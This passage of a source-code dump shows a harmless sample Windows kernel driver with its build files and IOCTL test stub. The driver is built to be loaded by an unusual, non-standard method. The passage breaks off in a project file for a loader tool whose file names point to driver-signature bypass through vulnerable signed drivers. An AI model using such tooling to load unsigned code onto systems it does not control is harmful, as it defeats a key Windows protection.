            Process,
            HandleToULong(PsGetCurrentThreadId()),
            Thread);

        switch (Irql) {

        case PASSIVE_LEVEL:
            sIrql = "PASSIVE_LEVEL";
            break;
        case APC_LEVEL:
            sIrql = "APC_LEVEL";
            break;
        case DISPATCH_LEVEL:
            sIrql = "DISPATCH_LEVEL";
            break;
        default:
            sIrql = "Unknown Value";
            break;
        }

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[%s] KeGetCurrentIrql=%s\r\n",
            __FUNCTION__,
            sIrql);
    }

    return STATUS_SUCCESS;
}

```

`Source/Examples/DummyDrv2/dummy.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "dummy", "dummy\dummy.vcxproj", "{3D8146DE-8064-46C0-9E70-CEEC357B2290}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{3D8146DE-8064-46C0-9E70-CEEC357B2290}.Release|x64.ActiveCfg = Release|x64
		{3D8146DE-8064-46C0-9E70-CEEC357B2290}.Release|x64.Build.0 = Release|x64
		{3D8146DE-8064-46C0-9E70-CEEC357B2290}.Release|x64.Deploy.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`Source/Examples/DummyDrv2/dummy/dummy.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{3D8146DE-8064-46C0-9E70-CEEC357B2290}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>dummy</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
    <ALLOW_DATE_TIME>1</ALLOW_DATE_TIME>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <ALLOW_DATE_TIME>1</ALLOW_DATE_TIME>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <CodeAnalysisRuleSet>AllRules.ruleset</CodeAnalysisRuleSet>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <CodeAnalysisRuleSet>AllRules.ruleset</CodeAnalysisRuleSet>
    <RunCodeAnalysis>false</RunCodeAnalysis>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <TargetName>dummy2</TargetName>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <SuppressStartupBanner>false</SuppressStartupBanner>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ExpandAttributedSource>true</ExpandAttributedSource>
      <AssemblerOutput>All</AssemblerOutput>
      <BrowseInformation>true</BrowseInformation>
      <CompileAs>CompileAsC</CompileAs>
      <EnablePREfast>false</EnablePREfast>
      <TreatWarningAsError>false</TreatWarningAsError>
      <Optimization>MinSpace</Optimization>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
    </ClCompile>
    <Link>
      <SuppressStartupBanner>false</SuppressStartupBanner>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <GenerateMapFile>true</GenerateMapFile>
      <MapExports>true</MapExports>
      <LargeAddressAware>true</LargeAddressAware>
      <EntryPointSymbol>DriverEntry</EntryPointSymbol>
      <RandomizedBaseAddress>true</RandomizedBaseAddress>
      <DataExecutionPrevention>true</DataExecutionPrevention>
      <Profile>false</Profile>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
    </ClCompile>
    <Link>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="main.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Examples/DummyDrv2/dummy/dummy.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="main.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Source/Examples/DummyDrv2/dummy/dummy.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <SignMode>Off</SignMode>
  </PropertyGroup>
</Project>
```

`Source/Examples/DummyDrv2/dummy/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2021
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.03
*
*  DATE:        02 Apr 2021
*
*  Example driver #2 for driver loaders usage (KDU/ALICE)
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include <ntddk.h>
#include "main.h"

/*
* PrintIrql
*
* Purpose:
*
* Debug print current irql.
*
*/
VOID PrintIrql()
{
    KIRQL Irql;
    PSTR sIrql;

    Irql = KeGetCurrentIrql();

    switch (Irql) {

    case PASSIVE_LEVEL:
        sIrql = "PASSIVE_LEVEL";
        break;
    case APC_LEVEL:
        sIrql = "APC_LEVEL";
        break;
    case DISPATCH_LEVEL:
        sIrql = "DISPATCH_LEVEL";
        break;
    case CMCI_LEVEL:
        sIrql = "CMCI_LEVEL";
        break;
    case CLOCK_LEVEL:
        sIrql = "CLOCK_LEVEL";
        break;
    case IPI_LEVEL:
        sIrql = "IPI_LEVEL";
        break;
    case HIGH_LEVEL:
        sIrql = "HIGH_LEVEL";
        break;
    default:
        sIrql = "Unknown Value";
        break;
    }

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] KeGetCurrentIrql=%u(%s)\r\n",
        __FUNCTION__,
        Irql,
        sIrql);
}

/*
* DevioctlDispatch
*
* Purpose:
*
* IRP_MJ_DEVICE_CONTROL dispatch.
*
*/
NTSTATUS DevioctlDispatch(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp
)
{
    NTSTATUS				status = STATUS_SUCCESS;
    ULONG					bytesIO = 0;
    PIO_STACK_LOCATION		stack;
    BOOLEAN					condition = FALSE;
    PINOUTPARAM             rp, wp;

    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] IRP_MJ_DEVICE_CONTROL\r\n",
        __FUNCTION__);

    stack = IoGetCurrentIrpStackLocation(Irp);

    do {

        if (stack == NULL) {
            status = STATUS_INTERNAL_ERROR;
            break;
        }

        rp = (PINOUTPARAM)Irp->AssociatedIrp.SystemBuffer;
        wp = (PINOUTPARAM)Irp->AssociatedIrp.SystemBuffer;
        if (rp == NULL) {
            status = STATUS_INVALID_PARAMETER;
            break;
        }

        switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case DUMMYDRV_REQUEST1:

            DbgPrintEx(DPFLTR_DEFAULT_ID,
                DPFLTR_INFO_LEVEL,
                "[%s] DUMMYDRV_REQUEST1 hit\r\n",
                __FUNCTION__);

            if (stack->Parameters.DeviceIoControl.InputBufferLength != sizeof(INOUT_PARAM)) {
                status = STATUS_INVALID_PARAMETER;
                break;
            }

            DbgPrintEx(DPFLTR_DEFAULT_ID,
                DPFLTR_INFO_LEVEL,
                "[%s] Params = %lx, %lx, %lx, %lx\r\n",
                __FUNCTION__,
                rp->Param1,
                rp->Param2,
                rp->Param3,
                rp->Param4);

            wp->Param1 = 11111111;
            wp->Param2 = 22222222;
            wp->Param3 = 33333333;
            wp->Param4 = 44444444;

            status = STATUS_SUCCESS;
            bytesIO = sizeof(INOUT_PARAM);

            break;

        default:

            DbgPrintEx(DPFLTR_DEFAULT_ID,
                DPFLTR_INFO_LEVEL,
                "[%s] Hit with invalid IoControlCode\r\n",
                __FUNCTION__);

            status = STATUS_INVALID_PARAMETER;
            break;
        };

    } while (condition);

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

/*
* UnsupportedDispatch
*
* Purpose:
*
* Unused IRP_MJ_* dispatch.
*
*/
NTSTATUS UnsupportedDispatch(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_NOT_SUPPORTED;
}

/*
* CreateDispatch
*
* Purpose:
*
* IRP_MJ_CREATE dispatch.
*
*/
NTSTATUS CreateDispatch(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp
)
{
    NTSTATUS status = Irp->IoStatus.Status;
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] Create\r\n",
        __FUNCTION__);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

/*
* CloseDispatch
*
* Purpose:
*
* IRP_MJ_CLOSE dispatch.
*
*/
NTSTATUS CloseDispatch(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp
)
{
    NTSTATUS status = Irp->IoStatus.Status;
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] Close\r\n",
        __FUNCTION__);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

/*
* DriverInitialize
*
* Purpose:
*
* Driver main.
*
*/
NTSTATUS DriverInitialize(
    _In_  struct _DRIVER_OBJECT* DriverObject,
    _In_  PUNICODE_STRING RegistryPath
)
{
    NTSTATUS        status;
    UNICODE_STRING  SymLink, DevName;
    PDEVICE_OBJECT  devobj;
    ULONG           t;

    PETHREAD        ThreadObject;
    PEPROCESS       ProcessObject;

    //RegistryPath is NULL
    UNREFERENCED_PARAMETER(RegistryPath);

    ProcessObject = PsGetCurrentProcess();
    ThreadObject = PsGetCurrentThread();

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] CurrentProcess : %lu (%p) CurrentThread : %lu (%p)\r\n",
        __FUNCTION__,
        HandleToUlong(PsGetCurrentProcessId()),
        ProcessObject,
        HandleToUlong(PsGetCurrentThreadId()),
        ThreadObject);

    RtlInitUnicodeString(&DevName, L"\\Device\\TDLD");
    status = IoCreateDevice(DriverObject, 0, &DevName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, TRUE, &devobj);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] IoCreateDevice(%wZ) = %lx\r\n",
        __FUNCTION__,
        &DevName,
        status);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&SymLink, L"\\DosDevices\\TDLD");
    status = IoCreateSymbolicLink(&SymLink, &DevName);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] IoCreateSymbolicLink(%wZ) = %lx\r\n",
        __FUNCTION__,
        &SymLink,
        status);

    devobj->Flags |= DO_BUFFERED_IO;

    for (t = 0; t <= IRP_MJ_MAXIMUM_FUNCTION; t++)
        DriverObject->MajorFunction[t] = &UnsupportedDispatch;

    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = &DevioctlDispatch;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = &CreateDispatch;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = &CloseDispatch;
    DriverObject->DriverUnload = NULL; //nonstandard way of driver loading, no unload

    devobj->Flags &= ~DO_DEVICE_INITIALIZING;
    return status;
}

/*
* DriverEntry
*
* Purpose:
*
* Driver base entry point.
*
*/
NTSTATUS DriverEntry(
    _In_  struct _DRIVER_OBJECT* DriverObject,
    _In_  PUNICODE_STRING RegistryPath
)
{
    NTSTATUS        status;
    UNICODE_STRING  drvName;

    /* This parameters are invalid due to nonstandard way of loading and should not be used. */
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[%s] Driver built at %s\r\n",
        __FUNCTION__, __TIMESTAMP__); // Set DriverModel to allow timestamps.

    PrintIrql();

    RtlInitUnicodeString(&drvName, L"\\Driver\\TDLD");
    status = IoCreateDriver(&drvName, &DriverInitialize);

    if (status == STATUS_OBJECT_NAME_COLLISION) {

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[%s] Driver object %wZ already exist\r\n",
            __FUNCTION__, &drvName);

    }
    else {

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[%s] IoCreateDriver(%wZ) = %lx\r\n",
            __FUNCTION__,
            &drvName,
            status);

    }

    return status;
}

```

`Source/Examples/DummyDrv2/dummy/main.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2017
*
*  TITLE:       MAIN.H
*
*  VERSION:     1.01
*
*  DATE:        20 Apr 2017
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

NTKERNELAPI
NTSTATUS
IoCreateDriver(
	_In_ PUNICODE_STRING DriverName, OPTIONAL
    _In_ PDRIVER_INITIALIZE InitializationFunction
	);

_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH DevioctlDispatch;
_Dispatch_type_(IRP_MJ_CREATE)
DRIVER_DISPATCH CreateDispatch;
_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH CloseDispatch;

_Dispatch_type_(IRP_MJ_CREATE)
_Dispatch_type_(IRP_MJ_CREATE_NAMED_PIPE)
_Dispatch_type_(IRP_MJ_CLOSE)
_Dispatch_type_(IRP_MJ_READ)
_Dispatch_type_(IRP_MJ_WRITE)
_Dispatch_type_(IRP_MJ_QUERY_INFORMATION)
_Dispatch_type_(IRP_MJ_SET_INFORMATION)
_Dispatch_type_(IRP_MJ_QUERY_EA)
_Dispatch_type_(IRP_MJ_SET_EA)
_Dispatch_type_(IRP_MJ_FLUSH_BUFFERS)
_Dispatch_type_(IRP_MJ_QUERY_VOLUME_INFORMATION)
_Dispatch_type_(IRP_MJ_SET_VOLUME_INFORMATION)
_Dispatch_type_(IRP_MJ_DIRECTORY_CONTROL)
_Dispatch_type_(IRP_MJ_FILE_SYSTEM_CONTROL)
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
_Dispatch_type_(IRP_MJ_INTERNAL_DEVICE_CONTROL)
_Dispatch_type_(IRP_MJ_SHUTDOWN)
_Dispatch_type_(IRP_MJ_LOCK_CONTROL)
_Dispatch_type_(IRP_MJ_CLEANUP)
_Dispatch_type_(IRP_MJ_CREATE_MAILSLOT)
_Dispatch_type_(IRP_MJ_QUERY_SECURITY)
_Dispatch_type_(IRP_MJ_SET_SECURITY)
_Dispatch_type_(IRP_MJ_POWER)
_Dispatch_type_(IRP_MJ_SYSTEM_CONTROL)
_Dispatch_type_(IRP_MJ_DEVICE_CHANGE)
_Dispatch_type_(IRP_MJ_QUERY_QUOTA)
_Dispatch_type_(IRP_MJ_SET_QUOTA)
_Dispatch_type_(IRP_MJ_PNP)
DRIVER_DISPATCH UnsupportedDispatch;

DRIVER_INITIALIZE DriverInitialize;
DRIVER_INITIALIZE DriverEntry;
#pragma alloc_text(INIT, DriverEntry)

#define DUMMYDRV_REQUEST1    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

typedef struct _INOUT_PARAM {
	ULONG Param1;
	ULONG Param2;
	ULONG Param3;
	ULONG Param4;
} INOUT_PARAM, *PINOUTPARAM;

```

`Source/Examples/DummyDrv2/dummy/r3request.c`:

```c
typedef struct _INOUT_PARAM{
	ULONG Param1;
	ULONG Param2;
	ULONG Param3;
	ULONG Param4;
} INOUT_PARAM, *PINOUT_PARAM;

#define DUMMYDRV_REQUEST1    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

VOID test(
	VOID
	)
{
	HANDLE          h;
	INOUT_PARAM     tmp;
	DWORD           bytesIO;

	h = CreateFile(TEXT("\\\\.\\TDLD"), GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (h != INVALID_HANDLE_VALUE) {

		tmp.Param1 = 0xAAAAAAAA;
		tmp.Param2 = 0xBBBBBBBB;
		tmp.Param3 = 0xCCCCCCCC;
		tmp.Param4 = 0xDDDDDDDD;

		DeviceIoControl(h, DUMMYDRV_REQUEST1,
			&tmp, sizeof(tmp), &tmp,
			sizeof(tmp), &bytesIO, NULL);

		CloseHandle(h);
	}

}
```

`Source/Hamakaze/KDU.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <ProjectGuid>{46C8FB0F-C8BF-4932-B84C-A10B38904728}</ProjectGuid>
    <RootNamespace>KDU</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>Hamakaze</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <PlatformToolset>v145</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
    <UseDebugLibraries>true</UseDebugLibraries>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <TargetName>kdu</TargetName>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <RunCodeAnalysis>true</RunCodeAnalysis>
    <CodeAnalysisRuleSet>NativeRecommendedRules.ruleset</CodeAnalysisRuleSet>
    <TargetName>kdu</TargetName>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <AdditionalIncludeDirectories>$(ProjectDir);$(SolutionDir);$(SolutionDir)\Shared;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <PostBuildEvent>
      <Command>"$(ProjectDir)Utils\GenAsIo2Unlock" .\output\$(Platform)\$(Configuration)\$(TargetName)$(TargetExt)</Command>
    </PostBuildEvent>
    <MASM>
      <AssembledCodeListingFile>shellstager.lst</AssembledCodeListingFile>
    </MASM>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <Optimization>MinSpace</Optimization>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <StringPooling>true</StringPooling>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <AdditionalIncludeDirectories>$(ProjectDir);$(SolutionDir);$(SolutionDir)\Shared;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <EnablePREfast>true</EnablePREfast>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <SetChecksum>true</SetChecksum>
      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
      <MinimumRequiredVersion>6.0</MinimumRequiredVersion>
    </Link>
    <PostBuildEvent>
      <Command>"$(ProjectDir)Utils\GenAsIo2Unlock" .\output\$(Platform)\$(Configuration)\$(TargetName)$(TargetExt)</Command>
    </PostBuildEvent>
    <MASM>
      <GenerateDebugInformation>false</GenerateDebugInformation>
    </MASM>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="..\Shared\ldr\ldr.cpp" />
    <ClCompile Include="..\Shared\minirtl\cmdline.c" />
    <ClCompile Include="..\Shared\minirtl\strtou64.c" />
    <ClCompile Include="..\Shared\minirtl\strtoul.c" />
    <ClCompile Include="..\Shared\minirtl\u64tohex.c" />
    <ClCompile Include="..\Shared\minirtl\_filename.c" />
    <ClCompile Include="..\Shared\minirtl\_strcat.c" />
    <ClCompile Include="..\Shared\minirtl\_strcmp.c" />
    <ClCompile Include="..\Shared\minirtl\_strcmpi.c" />
    <ClCompile Include="..\Shared\minirtl\_strcpy.c" />
    <ClCompile Include="..\Shared\minirtl\_strend.c" />
    <ClCompile Include="..\Shared\minirtl\_strlen.c" />
    <ClCompile Include="..\Shared\minirtl\_strncmp.c" />
    <ClCompile Include="..\Shared\minirtl\_strncpy.c" />
    <ClCompile Include="..\Shared\ntos\ntsup.c" />
    <ClCompile Include="..\Shared\thirdparty\tinyaes\aes.c" />
    <ClCompile Include="..\Shared\thirdparty\whirlpool\whirlpool.c" />
    <ClCompile Include="compress.cpp" />
    <ClCompile Include="drvmap.cpp" />
    <ClCompile Include="dsefix.cpp" />
    <ClCompile Include="hde\hde64.c" />
    <ClCompile Include="idrv\alcpu.cpp" />
    <ClCompile Include="idrv\asrdrv.cpp" />
    <ClCompile Include="idrv\atszio.cpp" />
    <ClCompile Include="idrv\binalyze.cpp" />
    <ClCompile Include="idrv\dbk.cpp" />
    <ClCompile Include="idrv\dell.cpp" />
    <ClCompile Include="idrv\directio64.cpp" />
